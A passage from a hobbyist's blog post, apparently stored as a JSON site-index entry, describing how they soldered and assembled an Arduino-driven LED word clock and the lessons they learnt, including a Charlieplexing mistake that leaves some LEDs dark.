(all of the hours), to get an idea on how it would all fit together.\nSoon after starting I realised the wire I had wasn\u0026rsquo;t the best type of wire for the job. It was too thick and heavy but it was the only corded wire I had. To be fair, it wasn\u0026rsquo;t terrible.\nI stuck on a podcast and got on with the rest of the soldering. After a few hours and a couple of breaks, I had all of the wiring completed. I stuck down some tracing paper to the back of the clock face and mounted the LED frame. One mistake I made (that I\u0026rsquo;ll point out now) was that I soldered up most of the LEDs with similar lengths of wire, not thinking about how they all wire up with each other; some wires have to travel further than others. This lack of forward-thinking led to a bit of a mess\u0026hellip; but a working mess:\nThe last thing to do was to cram all the wires into the frame and stick on the backplate:\nWhat I learnt This project was started and finished to satisfy two equally valued goals:\n to learn I wanted a clock  For the most part, both goals were achieved. There were many mistakes I made along the way that I had to roll with. I will be building another version of this clock at some point using the lessons I\u0026rsquo;ve learnt during this project. Let\u0026rsquo;s go through them.\nThe circuit I didn\u0026rsquo;t do enough planning and breadboarding. I jumped in far too soon. Next time I\u0026rsquo;ll make sure I have the circuit fully documented and breadboarded out before I jump to soldering.\nThe frame I didn\u0026rsquo;t take into account how heavy the LED frame would be on the back of the clock face. Sticking it directly to the back of the paper face worked out but it\u0026rsquo;s messy and will probably need fixing one day. I already have a couple of ideas on how the LED frame can fit snuggly within the clock face frame.\nThe wires The wires were way to thick for the job. The next version will use much thinner corded wire.\nCharlieplexing Charlieplexing the LEDs was a good idea in theory, and it was interesting to learn about whilst trying to apply it to a real problem I had, but had I given the project some more consideration and done a bit more prototyping I would have realised that I needed quite a few more LEDs than I first thought. It might have been that I\u0026rsquo;d come up with a more elegant solution for Charlieplexing thirty-two LEDs, or that I would have used a different technique altogether. In the next version, I\u0026rsquo;m going to try and use a few shift register chips which should give me much more control of the LEDs for a similar number of Arduino pins.\nThe missing LED I miscounted the number of pins I had on the Arduino and one of the LEDs inside the clock isn\u0026rsquo;t connected to anything. It\u0026rsquo;s the middle LED of \u0026ldquo;twenty-five\u0026rdquo;, which is also the only 3 LED word. Had I planned the Charlieplexing properly I wouldn\u0026rsquo;t have missed this LED.\nGlueing paper to paper I used a glue stick to bind the tracing paper to the back of the clock face. This, unfortunately, added moisture to the clock face and it now has a subtle \u0026ldquo;dried out wet paper\u0026rdquo; look in the light. I\u0026rsquo;ll probably tape the tracing paper to the back of the clock face next time.\nThe LEDs Honestly, they\u0026rsquo;re too bright for the job. I should have either doubled up the tracing paper or ran the LEDs on a lower current. I could have also positioned the LEDs differently, which I\u0026rsquo;ll be experimenting within the next version.\nA bug in the code? A day after I had the clock on display I noticed one of the LEDs wasn\u0026rsquo;t lit in \u0026ldquo;seven\u0026rdquo; when it read \u0026ldquo;It is seven o\u0026rsquo;clock\u0026rdquo;.\nI thought this was a bug in the code loaded onto the Arduino so I plugged the clock into my computer and poked around. What I found made me laugh and facepalm at the same time.\nRemember when we learnt earlier on that Charlieplexing is good when you don\u0026rsquo;t need to light up more than 1 LED at a time? Well, I missed that in all the noise of building the frame and wiring it all together.\nIn the above image, all of the LEDs marked in turquoise are the \u0026ldquo;support LEDs\u0026rdquo;. These LEDs are the ones that were stuck onto a Charlieplex of their own because I added them after I realised some words needed an extra LED or two to light up fully; they weren\u0026rsquo;t part of the original circuit I breadboarded. What I forgot is that the \u0026ldquo;o\u0026rsquo;clock\u0026rdquo; support LED can be on at the same time as:\n the three support LED the seven support LED the eight support LED the eleven support LED the twelve support LED  In short, if it\u0026rsquo;s three o\u0026rsquo;clock, seven o\u0026rsquo;clock, eight o\u0026rsquo;clock, eleven o\u0026rsquo;clock or twelve o\u0026rsquo;clock the support LED for that hour turns off and the support LED for \u0026ldquo;o\u0026rsquo;clock\u0026rdquo; turns on.\nConclusion Even with all of its faults, I\u0026rsquo;m really happy with my first sizable electronics project. I learnt a lot and I\u0026rsquo;m looking forward to building version two.\n","permalink":"/posts/text-clock/","summary":"A few years ago I came across a clock design that I hadn\u0026rsquo;t seen before. I thought the design was pretty cool and I wondered how hard it would be to build a webpage that would display similar wording that highlights to display the current time.\nI got to work hacking around, figuring out how to translate time in numbers to time in text. After a couple of hours I had something I was fairly happy with.","title":"Text Clock"}]